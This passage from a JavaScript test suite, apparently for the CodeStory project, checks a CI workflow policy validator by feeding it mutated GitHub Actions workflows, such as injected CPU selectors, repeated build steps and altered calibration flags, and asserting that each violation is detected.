import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmodSync,
  linkSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { loadReleaseClaimGraph } from "../../scripts/codestory-release-claims.mjs";
import {
  LOST_RUNNER_ANNOTATION,
  MAXIMUM_RUN_ATTEMPTS,
} from "./lost-runner-recovery.mjs";
import {
  absorbedFailureViolations,
  annotationScopeViolations,
  basicWorkflowViolations,
  dispatchInputInterpolationViolations,
  draftSourcePolicyViolations,
  draftWorkflowPolicyViolations,
  interpolationSpans,
  loadWorkflows,
  lostRunnerRecoveryViolations,
  macosCliDistributionViolations,
  notaryStepViolations,
  packagedPrSigningViolations,
  parseWorkflow,
  qualificationDriverArtifactViolations,
  releaseEvidenceApprovalViolations,
  releaseProofCpuSelectorViolations,
  releaseEvidenceWorkflowRef,
  releaseWorkflowContractViolations,
  retrievalFile,
  retrievalProducerTriggerPolicyViolations,
  shellDependentBindingViolations,
  validateCargoTestFilters,
  validateWorkflows,
  windowsManifestProofPolicyViolations,
} from "./check-workflow-policy.mjs";
import {
  produceQualificationDriverArtifact,
  verifyQualificationDriverArtifact,
} from "./qualification-driver-artifact.mjs";

const fullSha = "0123456789abcdef0123456789abcdef01234567";
const proofTopology = "proof5-v1-64015a841a2f69f33f7c9ce284f671ad27b3923a58db865fd4806d86230df6c5";
const cacheManifestIdentity = "${{ hashFiles('Cargo.toml', 'crates/**/Cargo.toml', 'vendor/**/Cargo.toml') }}";
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");

function draftSourceJob() {
  return structuredClone(loadWorkflows().get("rust-ci.yml").jobs["linux-draft"]);
}

function draftSourceWorkflow() {
  return structuredClone(loadWorkflows().get("rust-ci.yml"));
}

function retrievalSourceJob() {
  return structuredClone(loadWorkflows().get(retrievalFile).jobs["linux-contracts"]);
}

function retrievalSourceWorkflow() {
  return structuredClone(loadWorkflows().get(retrievalFile));
}

function windowsManifestWorkflow() {
  return retrievalSourceWorkflow();
}

function draftStep(job, name) {
  const matches = job.steps.filter(step => step.name === name);
  assert.equal(matches.length, 1, `expected one ${name} step`);
  return matches[0];
}

function moveNamedStepAfter(job, movedName, afterName) {
  const movedIndex = job.steps.findIndex(step => step.name === movedName);
  assert.notEqual(movedIndex, -1, `missing ${movedName}`);
  const [moved] = job.steps.splice(movedIndex, 1);
  const afterIndex = job.steps.findIndex(step => step.name === afterName);
  assert.notEqual(afterIndex, -1, `missing ${afterName}`);
  job.steps.splice(afterIndex + 1, 0, moved);
}

function runResolver(file, jobName, environment) {
  const workflow = loadWorkflows().get(file);
  const run = draftStep(workflow.jobs[jobName], "Resolve trusted exact head").run;
  const directory = mkdtempSync(path.join(os.tmpdir(), "codestory-proof-resolver-"));
  const fakeGh = path.join(directory, "gh");
  const baseSha = "1".repeat(40);
  writeFileSync(fakeGh, `#!/bin/sh
case "$*" in
  *"branches/dev/codestory-next"*) printf '%s\\n' '${fullSha}' ;;
  *) printf '%s\\n' '${JSON.stringify({
    head: {
      repo: { full_name: "TheGreenCedar/CodeStory" },
      sha: fullSha,
      ref: "codex/exact-head",
    },
    base: { sha: baseSha, ref: "dev/codestory-next" },
    labels: [{ name: "review-accepted" }],
  })}' ;;
esac
`);
  chmodSync(fakeGh, 0o755);
  const output = path.join(directory, "github-output");
  writeFileSync(output, "");
  return spawnSync("bash", ["-c", run], {
    encoding: "utf8",
    env: {
      ...process.env,
      PATH: `${directory}:${process.env.PATH}`,
      GH_TOKEN: "test-token",
      GITHUB_REPOSITORY: "TheGreenCedar/CodeStory",
      GITHUB_OUTPUT: output,
      ...environment,
    },
  });
}

function runReleaseAuthority(environment, liveSha = fullSha) {
  const workflow = loadWorkflows().get("release.yml");
  const run = draftStep(workflow.jobs.preflight, "Validate release authority").run;
  const quote = value => `'${String(value).replaceAll("'", `'"'"'`)}'`;
  const exports = Object.entries({
    GH_TOKEN: "test-token",
    GITHUB_REPOSITORY: "TheGreenCedar/CodeStory",
    ...environment,
  })
    .map(([key, value]) => `export ${key}=${quote(value)}`)
    .join("\n");
  const command = `gh() { printf '%s\\n' ${quote(liveSha)}; }
${exports}
${run}`;
  const executable = process.platform === "win32" ? "wsl.exe" : "bash";
  const args = process.platform === "win32"
    ? ["--exec", "/bin/bash", "-c", command]
    : ["-c", command];
  return spawnSync(executable, args, {
    encoding: "utf8",
  });
}

const calibrationReleaseChecker = path.join(
  root,
  ".github/scripts/check-calibration-release-lineage.py",
);
const calibrationConstantSet =
  "crates/codestory-llama-sys/per-user-embedding-server-constant-set.json";
const calibrationGitEnvironment = {
  ...process.env,
  GIT_AUTHOR_NAME: "CodeStory Proof",
  GIT_AUTHOR_EMAIL: "proof@codestory.invalid",
  GIT_COMMITTER_NAME: "CodeStory Proof",
  GIT_COMMITTER_EMAIL: "proof@codestory.invalid",
  GIT_AUTHOR_DATE: "2026-01-01T00:00:00+00:00",
  GIT_COMMITTER_DATE: "2026-01-01T00:00:00+00:00",
  GIT_CONFIG_GLOBAL: os.devNull,
  GIT_CONFIG_SYSTEM: os.devNull,
};

function calibrationGit(repository, ...gitArguments) {
  const result = spawnSync(
    "git",
    ["-c", "commit.gpgsign=false", ...gitArguments],
    {
      cwd: repository,
      encoding: "utf8",
      env: calibrationGitEnvironment,
    },
  );
  assert.equal(
    result.status,
    0,
    result.stderr || result.stdout || `git ${gitArguments.join(" ")} failed`,
  );
  return result.stdout.trim();
}

function writeCalibrationFixture(repository, relative, contents) {
  const target = path.join(repository, relative);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, contents);
}

function commitCalibrationFixture(repository, message) {
  calibrationGit(repository, "add", "-A");
  calibrationGit(repository, "commit", "--no-verify", "-q", "-m", message);
  return {
    commit: calibrationGit(repository, "rev-parse", "HEAD"),
    tree: calibrationGit(repository, "rev-parse", "HEAD^{tree}"),
  };
}

function runCalibrationReleaseCheck(repository, expectedSha) {
  return spawnSync(
    "python",
    [
      calibrationReleaseChecker,
      "--repo",
      repository,
      "--expected-sha",
      expectedSha,
    ],
    {
      cwd: root,
      encoding: "utf8",
    },
  );
}

const marketplaceGuardName = "Validate the dispatched release coordinates";

function marketplaceGuardStep() {
  return draftStep(loadWorkflows().get("marketplace-sync.yml").jobs.sync, marketplaceGuardName);
}

// Actions executes a `run:` body with the shell the step declares, so a harness that hardcodes
// bash measures a script the workflow may no longer run. Resolving the declared key here is what
// makes the refusals below evidence about the step as written: flip the workflow to `shell: sh`
// and this suite re-runs the guard under `sh`, where it stops refusing.
function marketplaceGuardShell(step) {
  const declared = step.shell;
  assert.equal(
    typeof declared,
    "string",
    `${marketplaceGuardName} must declare its shell; the harness will not guess one`,
  );
  const known = { bash: "bash", sh: "sh" };
  assert.ok(
    Object.hasOwn(known, declared),
    `${marketplaceGuardName} declares shell ${JSON.stringify(declared)}, which this harness cannot run`,
  );
  return known[declared];
}

// The dispatched values arrive through the environment, so a value containing a newline stays one
// value instead of being re-split by the harness. Text assertions cannot tell an enforcing guard
// from a decorative one, so the guard is measured against the values it exists to refuse.
function spawnMarketplaceGuard(shell, run, environment) {
  const executable = process.platform === "win32" ? "wsl.exe" : shell;
  const args = process.platform === "win32"
    ? ["--exec", shell.startsWith("/") ? shell : `/bin/${shell}`, "-c", run]
    : ["-c", run];
  return { shell, ...spawnSync(executable, args, {
    encoding: "utf8",
    env: { ...process.env, ...environment },
  }) };
}

function runMarketplaceGuard(environment) {
  const step = marketplaceGuardStep();
  return spawnMarketplaceGuard(marketplaceGuardShell(step), step.run, environment);
}

// A POSIX shell that genuinely lacks `[[`. macOS ships `/bin/sh` as bash in POSIX mode, which
// still has it, so the candidate is probed rather than assumed.
function posixShellWithoutDoubleBracket() {
  for (const candidate of ["dash", "/bin/dash", "sh", "/bin/sh"]) {
    const usable = spawnSync(candidate, ["-c", "exit 0"], { encoding: "utf8" });
    if (usable.error !== undefined || usable.status !== 0) continue;
    const probe = spawnSync(candidate, ["-c", "[[ 1 = 1 ]]"], { encoding: "utf8" });
    if (probe.status !== 0) return candidate;
  }
  return undefined;
}

function windowsManifestJob(workflow) {
  return workflow.jobs["windows-manifest-missing"];
}

function windowsManifestStep(workflow, name) {
  return draftStep(windowsManifestJob(workflow), name);
}

function releaseEvidenceApprovalBoundary() {
  return {
    callers: [
      ["release.yml", {
        uses: releaseEvidenceWorkflowRef,
        with: { source_run_id: "${{ inputs.source_run_id }}" },
        secrets: {
          CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON:
            "${{ secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}",
        },
      }, true],
      ["packaged-platform-pr.yml", {
        uses: releaseEvidenceWorkflowRef,
        with: { source_run_id: "${{ inputs.source_run_id }}" },
      }, false],
    ],
    called: {
      on: {
        workflow_call: {
          secrets: {
            CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON: { required: false },
          },
        },
      },
      jobs: {
        measure: {
          environment: "release-evidence",
          steps: [
            {
              name: "Produce and evaluate same-SHA candidate",
              env: {
                APPROVAL_JSON: "${{ secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}",
              },
              run: [
                'if [ -n "$SOURCE_RUN_ID" ] && [ -z "$APPROVAL_JSON" ]; then',
                '  echo "::error::Protected release-evidence approval is required for source-run re-evaluation."',
                "  exit 1",
                "fi",
              ].join("\n"),
            },
          ],
        },
      },
    },
  };
}

test("parser ignores YAML comments and harmless formatting", () => {
  const block = parseWorkflow(`
on:
  pull_request:
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/action@${fullSha}
# uses: vendor/action@main
`);
  const flow = parseWorkflow(`
"on": { pull_request: null }
permissions: { contents: read }
jobs: { check: { runs-on: ubuntu-latest, steps: [ { uses: vendor/action@${fullSha} } ] } }
`);
  assert.deepEqual(block, flow);
});

test("release evidence policy pins the release-only Axios v2 task and corpus", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "release-candidate-evidence.yml";
  const mutations = [
    ["repo corpus drifts", workflow => {
      draftStep(workflow.jobs.measure, "Produce full-retrieval repo evidence")
        .env.CODESTORY_RELEASE_EVIDENCE_CORPUS_ID = "codestory-release-corpus-v0.16-axios-js-ts-v1";
    }, /repo evidence must bind the v0\.16 Axios v2 corpus/u],
    ["packet corpus contract drifts", workflow => {
      draftStep(workflow.jobs.measure, "Produce publishable packet evidence")
        .env.CODESTORY_RELEASE_EVIDENCE_CORPUS_CONTRACT
          = "benchmarks/release-evidence/corpus-contracts/v0.16-axios-js-ts-v1.json";
    }, /packet evidence must bind the v0\.16 Axios v2 corpus contract/u],
    ["packet task falls back to the holdout suite", workflow => {
      const step = draftStep(workflow.jobs.measure, "Produce publishable packet evidence");
      step.run = step.run.replace(
        /--task-manifest [^\\\n]+/u,
        "--task-suite holdout-retrieval --task-ids axios-request-dispatch",
      );
    }, /must select only the corpus-bound release task manifest/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
});

test("every release-proof workflow rejects CPU selectors at every structural level", async (t) => {
  const graph = loadReleaseClaimGraph(root);
  const releaseProofFiles = [
    "auto-release.yml",
    "packaged-platform-pr.yml",
    ...new Set([
      ...graph.evidence_types.flatMap(({ proof_lanes: lanes }) => lanes),
      ...graph.workflow_policy.artifact_workflows,
      ...graph.workflow_policy.protected_jobs.map(({ workflow }) => workflow),
      graph.workflow_policy.calibration.coordinator_workflow,
      ...graph.workflow_policy.calibration.required_cells.map(({ workflow }) => workflow),
      ...graph.workflow_policy.calibration.optional_cells.map(({ workflow }) => workflow),
      graph.workflow_policy.qualification.coordinator_workflow,
      ...graph.workflow_policy.qualification.required_cells.map(({ workflow }) => workflow),
      ...graph.workflow_policy.qualification.optional_cells.map(({ workflow }) => workflow),
    ].map(file => path.basename(file))),
  ];
  assert.deepEqual(releaseProofCpuSelectorViolations(loadWorkflows(), graph), []);

  const mutations = [
    ["workflow environment", workflow => {
      workflow.env = { ...workflow.env, CODESTORY_EMBED_ALLOW_CPU: "1" };
    }],
    ["job environment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.env = { ...job.env, CODESTORY_EMBED_ALLOW_CPU: 1 };
    }],
    ["step environment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [{ name: "Injected CPU selector", run: "true" }];
      job.steps[0].env = {
        ...job.steps[0].env,
        CODESTORY_EMBED_ALLOW_CPU: "1",
      };
    }],
    ["inline environment assignment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: "CODESTORY_EMBED_ALLOW_CPU=1 true",
      });
    }],
    ["inline arithmetic environment assignment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: "CODESTORY_EMBED_ALLOW_CPU=$((1)) true",
      });
    }],
    ["inline command-substitution environment assignment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: "CODESTORY_EMBED_ALLOW_CPU=$(printf 1) true",
      });
    }],
    ["indirect environment assignment", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected selector indirection",
        run: 'selector=CODESTORY_EMBED_ALLOW_CPU; export "$selector=1"',
      });
    }],
    ["equal-form engine policy", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: "codestory-proof --engine-policy=cpu_explicit",
      });
    }],
    ["shell-concatenated engine policy", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: 'codestory-proof --engine-policy cpu_"explicit"',
      });
    }],
    ["spaced backend flag", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: "codestory-proof --expected-backend CPU",
      });
    }],
    ["shell-concatenated backend flag", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected CPU selector",
        run: 'codestory-proof --expected-backend "c"pu',
      });
    }],
    ["indirect backend arguments", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.steps ??= [];
      job.steps.push({
        name: "Injected backend indirection",
        run: "backend_flag=--expected-backend; backend_value=cpu; codestory-proof \"$backend_flag\" \"$backend_value\"",
      });
    }],
    ["matrix semantic key", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.strategy = { matrix: { include: [{ engine_policy: "cpu_explicit" }] } };
    }],
    ["whitespace-wrapped matrix policy", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.strategy = { matrix: { include: [{ engine_policy: " CPU_EXPLICIT " }] } };
    }],
    ["whitespace-wrapped matrix backend", workflow => {
      const job = Object.values(workflow.jobs)[0];
      job.strategy = { matrix: { include: [{ backend: " CPU " }] } };
    }],
  ];

  for (const file of releaseProofFiles) {
    for (const [shape, mutate] of mutations) {
      await t.test(`${file}: ${shape}`, () => {
        const workflows = loadWorkflows();
        mutate(workflows.get(file));
        assert.match(
          releaseProofCpuSelectorViolations(workflows, graph).join("\n"),
          new RegExp(`\\[cpu_selector\\] ${file.replaceAll(".", "\\.")}`, "u"),
        );
      });
    }
  }

  await t.test("non-release source workflow cannot enable the product CPU selector", () => {
    const workflows = loadWorkflows();
    workflows.get("rust-ci.yml").jobs["linux-draft"].env = {
      CODESTORY_EMBED_ALLOW_CPU: "1",
    };
    assert.match(
      releaseProofCpuSelectorViolations(workflows, graph).join("\n"),
      /\[cpu_selector\] rust-ci\.yml/u,
    );
  });
  await t.test("release proof cannot use the CPU test seam", () => {
    const workflows = loadWorkflows();
    workflows.get("macos-metal-proof.yml").jobs["packaged-metal"].env = {
      CODESTORY_TEST_EMBED_ALLOW_CPU: "1",
    };
    assert.match(
      releaseProofCpuSelectorViolations(workflows, graph).join("\n"),
      /\[cpu_test_seam\] macos-metal-proof\.yml/u,
    );
  });
  await t.test("unrelated source job cannot claim the CPU test seam", () => {
    const workflows = loadWorkflows();
    workflows.get("rust-ci.yml").jobs["linux-draft"].env = {
      CODESTORY_TEST_EMBED_ALLOW_CPU: "1",
    };
    assert.match(
      releaseProofCpuSelectorViolations(workflows, graph).join("\n"),
      /\[cpu_test_seam\] rust-ci\.yml/u,
    );
  });
  await t.test("allowlisted source test cannot move the seam to a step", () => {
    const workflows = loadWorkflows();
    const workflow = workflows.get("retrieval-engine-smoke.yml");
    delete workflow.jobs["linux-contracts"].env.CODESTORY_TEST_EMBED_ALLOW_CPU;
    workflow.jobs["linux-contracts"].steps[0].env = {
      CODESTORY_TEST_EMBED_ALLOW_CPU: "1",
    };
    assert.match(
      releaseProofCpuSelectorViolations(workflows, graph).join("\n"),
      /\[cpu_test_seam\] retrieval-engine-smoke\.yml/u,
    );
  });

  const supportSources = new Map([
    [
      "scripts/release-evidence/guest-runner.sh",
      readFileSync(path.join(root, "scripts/release-evidence/guest-runner.sh"), "utf8"),
    ],
    [
      ".github/scripts/check-linux-glibc-baseline.sh",
      readFileSync(path.join(root, ".github/scripts/check-linux-glibc-baseline.sh"), "utf8"),
    ],
    [
      "scripts/release-evidence/guest-verify.sh",
      readFileSync(path.join(root, "scripts/release-evidence/guest-verify.sh"), "utf8"),
    ],
  ]);
  await t.test("runner service re-enables CPU", () => {
    const mutated = new Map(supportSources);
    mutated.set(
      "scripts/release-evidence/guest-runner.sh",
      mutated.get("scripts/release-evidence/guest-runner.sh")
        .replace("CODESTORY_EMBED_ALLOW_CPU=0", "CODESTORY_EMBED_ALLOW_CPU=1"),
    );
    assert.match(
      releaseProofCpuSelectorViolations(loadWorkflows(), graph, mutated).join("\n"),
      /guest-runner\.sh contains a CPU proof selector/u,
    );
  });
  for (const [shape, assignment] of [
    ["arithmetic", "CODESTORY_EMBED_ALLOW_CPU=$((1))"],
    ["command substitution", "CODESTORY_EMBED_ALLOW_CPU=$(printf 1)"],
  ]) {
    await t.test(`runner service re-enables CPU through ${shape}`, () => {
      const mutated = new Map(supportSources);
      mutated.set(
        "scripts/release-evidence/guest-runner.sh",
        mutated.get("scripts/release-evidence/guest-runner.sh")
          .replace("CODESTORY_EMBED_ALLOW_CPU=0", assignment),
      );
      assert.match(
        releaseProofCpuSelectorViolations(loadWorkflows(), graph, mutated).join("\n"),
        /guest-runner\.sh contains a CPU proof selector/u,
      );
    });
  }
  await t.test("glibc smoke re-enables CPU", () => {
    const mutated = new Map(supportSources);
    mutated.set(
      ".github/scripts/check-linux-glibc-baseline.sh",
      mutated.get(".github/scripts/check-linux-glibc-baseline.sh")
        .replace("CODESTORY_EMBED_ALLOW_CPU=0", "CODESTORY_EMBED_ALLOW_CPU=1"),
    );
    assert.match(
      releaseProofCpuSelectorViolations(loadWorkflows(), graph, mutated).join("\n"),
      /check-linux-glibc-baseline\.sh contains a CPU proof selector/u,
    );
  });
  await t.test("runner verification stops proving CPU disabled", () => {
    const mutated = new Map(supportSources);
    mutated.set(
      "scripts/release-evidence/guest-verify.sh",
      mutated.get("scripts/release-evidence/guest-verify.sh")
        .replace('grep -qxF "CODESTORY_EMBED_ALLOW_CPU=0"', "grep -qxF ignored"),
    );
    assert.match(
      releaseProofCpuSelectorViolations(loadWorkflows(), graph, mutated).join("\n"),
      /guest-verify\.sh must prove CPU is disabled/u,
    );
  });
});

test("constant calibration structure rejects qualification, 3x3 sampling, repeated setup, and Linux gating", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const metalFile = "macos-metal-proof.yml";
  const coordinatorFile = "packaged-platform-pr.yml";
  const collector = workflow => draftStep(
    workflow.jobs["packaged-metal"],
    "Collect three independent Metal constant calibration runs",
  );
  const nativeBuild = workflow => draftStep(
    workflow.jobs["packaged-metal"],
    "Build and package native CLI",
  );
  const metalTiming = workflow => draftStep(
    workflow.jobs["packaged-metal"],
    "Publish Metal constant calibration timing",
  );
  const linuxCollector = workflow => draftStep(
    workflow.jobs["optional-constant-calibration"],
    "Collect optional Linux Vulkan constant calibration",
  );
  const linuxNativeBuild = workflow => draftStep(
    workflow.jobs["optional-constant-calibration"],
    "Build and package native CLI and constant driver",
  );
  const assembly = workflow => workflow.jobs["calibration-assemble"];
  const assemblyStep = workflow => draftStep(
    assembly(workflow),
    "Assemble frozen calibration candidate",
  );

  const mutations = [
    ["qualification scenario enters calibration", metalFile, workflow => {
      collector(workflow).run += "\n--qualification-scenario lifecycle";
    }, /without full qualification or nested sampling/u],
    ["fault evidence enters calibration", metalFile, workflow => {
      collector(workflow).run += "\n--publication-fault-evidence target/fault.json";
    }, /without full qualification or nested sampling/u],
    ["quality evidence enters calibration", metalFile, workflow => {
      collector(workflow).run += "\n--retrieval-quality-evidence target/quality.json";
    }, /without full qualification or nested sampling/u],
    ["full qualification producer enters calibration", metalFile, workflow => {
      collector(workflow).run += "\n--produce-qualification-evidence";
    }, /without full qualification or nested sampling/u],
    ["full qualification driver executes during calibration", metalFile, workflow => {
      collector(workflow).run +=
        "\ntarget/release/codestory_embedding_qualification --project target/calibration-project";
    }, /reviewed protected Metal workflow structure/u],
    ["shell-concatenated qualification producer enters calibration", metalFile, workflow => {
      collector(workflow).run = collector(workflow).run.replace(
        "--out-dir target/calibration-proof/macos",
        '--produce-"qualification-evidence" \\\n  --out-dir target/calibration-proof/macos',
      );
    }, /without full qualification or nested sampling/u],
    ["shell-concatenated qualification evidence enters calibration", metalFile, workflow => {
      collector(workflow).run = collector(workflow).run.replace(
        "--out-dir target/calibration-proof/macos",
        '--qualification-"evidence" target/qualification.json \\\n  --out-dir target/calibration-proof/macos',
      );
    }, /without full qualification or nested sampling/u],
    ["shell-concatenated fault evidence enters calibration", metalFile, workflow => {
      collector(workflow).run = collector(workflow).run.replace(
        "--out-dir target/calibration-proof/macos",
        '--publication-"fault-evidence" target/fault.json \\\n  --out-dir target/calibration-proof/macos',
      );
    }, /without full qualification or nested sampling/u],
    ["3x3 sampling is requested", metalFile, workflow => {
      collector(workflow).run += "\n--samples-per-metric 3";
    }, /without full qualification or nested sampling/u],
    ["outer run loop returns", metalFile, workflow => {
      collector(workflow).run = `for run_index in 1 2 3; do\n${collector(workflow).run}\ndone`;
    }, /without full qualification or nested sampling/u],
    ["renamed outer run loop returns", metalFile, workflow => {
      collector(workflow).run = `for attempt in 1 2 3; do\n${collector(workflow).run}\ndone`;
    }, /without full qualification or nested sampling/u],
    ["brace-expanded outer run loop returns", metalFile, workflow => {
      collector(workflow).run = `for attempt in {1..3}; do\n${collector(workflow).run}\ndone`;
    }, /without full qualification or nested sampling/u],
    ["collector is invoked twice", metalFile, workflow => {
      collector(workflow).run += `\n${collector(workflow).run}`;
    }, /without full qualification or nested sampling/u],
    ["Metal collector accepts a checkout project", metalFile, workflow => {
      collector(workflow).run += "\n--project \"$GITHUB_WORKSPACE\"";
    }, /synthetic-project constant collector/u],
    ["Metal collector accepts a plugin root", metalFile, workflow => {
      collector(workflow).run += "\n--plugin-root plugins\/codestory";
    }, /synthetic-project constant collector/u],
    ["Metal collector accepts a plugin handoff", metalFile, workflow => {
      collector(workflow).run += "\n--plugin-handoff";
    }, /synthetic-project constant collector/u],
    ["Metal proof output enters retained calibration root", metalFile, workflow => {
      collector(workflow).run = collector(workflow).run.replace(
        "--out-dir target/calibration-proof/macos",
        "--out-dir target/calibration-runs/macos/proof",
      );
    }, /must run --out-dir target\/calibration-proof\/macos/u],
    ["Cargo build repeats", metalFile, workflow => {
      nativeBuild(workflow).run += '\ncargo build --release --locked "${cargo_args[@]}"';
    }, /one shared Cargo invocation and package once/u],
    ["package repeats", metalFile, workflow => {
      nativeBuild(workflow).run += "\npython3 .github/scripts/package-codestory-release.py --version 0.0.0";
    }, /one shared Cargo invocation and package once/u],
    ["model preparation repeats", metalFile, workflow => {
      workflow.jobs["packaged-metal"].steps.push({
        name: "Prepare model again",
        run: "node scripts/prepare-embedded-model.mjs",
      });
    }, /one shared Cargo invocation and package once/u],
    ["Cargo build repeats in a separate step", metalFile, workflow => {
      workflow.jobs["packaged-metal"].steps.push({
        name: "Build native CLI again",
        shell: "bash",
        run: "cargo build --release --locked -p codestory-cli",
      });
    }, /one shared Cargo invocation and package once/u],
    ["packaging repeats in a separate step", metalFile, workflow => {
      workflow.jobs["packaged-metal"].steps.push({
        name: "Package native CLI again",
        shell: "bash",
        run: "python3 .github/scripts/package-codestory-release.py --version 0.16.3",
      });
    }, /one shared Cargo invocation and package once/u],
    ["shell-concatenated model preparation repeats", metalFile, workflow => {
      workflow.jobs["packaged-metal"].steps.push({
        name: "Prepare model material again",
        shell: "bash",
        run: 'node scripts/prepare-"embedded-model".mjs',
      });
    }, /one shared Cargo invocation and package once/u],
    ["complete packaged calibration harness repeats", metalFile, workflow => {
      const repeated = collector(workflow).run
        .replaceAll("target/calibration-runs/macos", "target/calibration-runs/macos-again")
        .replaceAll("target/calibration-proof/macos", "target/calibration-proof/macos-again");
      workflow.jobs["packaged-metal"].steps.push({
        name: "Collect constant calibration again",
        shell: "bash",
        run: repeated,
      });
    }, /one shared Cargo invocation and package once/u],
    ["shared build and package timing loses its output identity", metalFile, workflow => {
      delete nativeBuild(workflow).id;
    }, /one shared Cargo invocation and package once/u],
    ["shared build and package timing is not measured once", metalFile, workflow => {
      nativeBuild(workflow).run = nativeBuild(workflow).run.replace(
        "build_package_finished_ns=\"$(python3 -c 'import time; print(time.monotonic_ns())')\"",
        "build_package_finished_ns=\"$build_package_started_ns\"",
      );
    }, /one shared Cargo invocation and package once/u],
    ["calibration total clock loses its output identity", metalFile, workflow => {
      delete draftStep(
        workflow.jobs["packaged-metal"],
        "Start Metal constant calibration clock",
      ).id;
    }, /time model preparation and total wall time/u],
    ["model preparation loses measured duration", metalFile, workflow => {
      const model = draftStep(
        workflow.jobs["packaged-metal"],
        "Prepare checksum-pinned embedded model",
      );
      model.run = model.run.replace(
        "model_prepare_finished_ns=\"$(python3 -c 'import time; print(time.monotonic_ns())')\"",
        "model_prepare_finished_ns=\"$model_prepare_started_ns\"",
      );
    }, /time model preparation and total wall time/u],
    ["timing summary loses shared build and package duration", metalFile, workflow => {
      metalTiming(workflow).env.BUILD_PACKAGE_DURATION_MS = "0";
    }, /shared build\/package and five-phase collector timing/u],
    ["timing summary loses model preparation duration", metalFile, workflow => {
      metalTiming(workflow).env.MODEL_PREPARATION_DURATION_MS = "0";
    }, /shared build\/package and five-phase collector timing/u],
    ["timing summary weakens the ten-minute target", metalFile, workflow => {
      metalTiming(workflow).run = metalTiming(workflow).run.replace(
        'test "$calibration_total_ms" -lt 600000',
        'test "$calibration_total_ms" -lt 900000',
      );
    }, /shared build\/package and five-phase collector timing/u],
    ["timing summary is not published", metalFile, workflow => {
      metalTiming(workflow).run = metalTiming(workflow).run.replace(
        "$GITHUB_STEP_SUMMARY",
        "$IGNORED_SUMMARY",
      );
    }, /shared build\/package and five-phase collector timing/u],
    ...[
      "archive_authentication_unpack_ms",
      "project_and_request_setup_ms",
      "measurement_ms",
      "retention_validation_ms",
      "end_to_end_ms",
    ].map(field => [
      `timing summary drops ${field}`,
      metalFile,
      workflow => {
        metalTiming(workflow).run = metalTiming(workflow).run.replaceAll(
          field,
          "omitted_timing_value",
        );
      },
      /shared build\/package and five-phase collector timing/u,
    ]),
    ["Linux collector accepts a checkout project", "linux-vulkan-proof.yml", workflow => {
      linuxCollector(workflow).run += "\n--project \"$GITHUB_WORKSPACE\"";
    }, /synthetic project without qualification/u],
    ["Linux collector accepts a plugin root", "linux-vulkan-proof.yml", workflow => {
      linuxCollector(workflow).run += "\n--plugin-root plugins\/codestory";
    }, /synthetic project without qualification/u],
    ["Linux collector accepts a plugin handoff", "linux-vulkan-proof.yml", workflow => {
      linuxCollector(workflow).run += "\n--plugin-handoff";
    }, /synthetic project without qualification/u],
    ["Linux proof output enters retained calibration root", "linux-vulkan-proof.yml", workflow => {
      linuxCollector(workflow).run = linuxCollector(workflow).run.replace(
        "--out-dir target/calibration-proof/linux-vulkan",
        "--out-dir target/calibration-runs/linux-vulkan/proof",
      );
    }, /must run --out-dir target\/calibration-proof\/linux-vulkan/u],
    ["Linux diagnostic upload drops disjoint proof output", "linux-vulkan-proof.yml", workflow => {
      const upload = draftStep(
        workflow.jobs["optional-constant-calibration"],
        "Upload optional Linux Vulkan calibration evidence",
      );
      upload.with.path = upload.with.path.replace(
        "target/calibration-proof/linux-vulkan",
        "",
      );
    }, /must upload attempt-scoped non-selecting evidence/u],
    ["Linux calibration requires an upstream package run", "linux-vulkan-proof.yml", workflow => {
      workflow.on.workflow_dispatch.inputs.package_run_id.required = true;
      delete workflow.on.workflow_dispatch.inputs.package_run_id.default;
    }, /must not require an upstream package run/u],
    ["Linux calibration downloads an independently built package", "linux-vulkan-proof.yml", workflow => {
      workflow.jobs["optional-constant-calibration"].steps.splice(5, 0, {
        name: "Download exact Linux package",
        uses: "actions/download-artifact@v8.0.1",
        with: {
          name: "codestory-cli-linux-x64",
          "run-id": "${{ inputs.package_run_id }}",
        },
      });
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
    ["Linux calibration reads package_run_id", "linux-vulkan-proof.yml", workflow => {
      linuxNativeBuild(workflow).env.PACKAGE_RUN_ID = "${{ inputs.package_run_id }}";
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
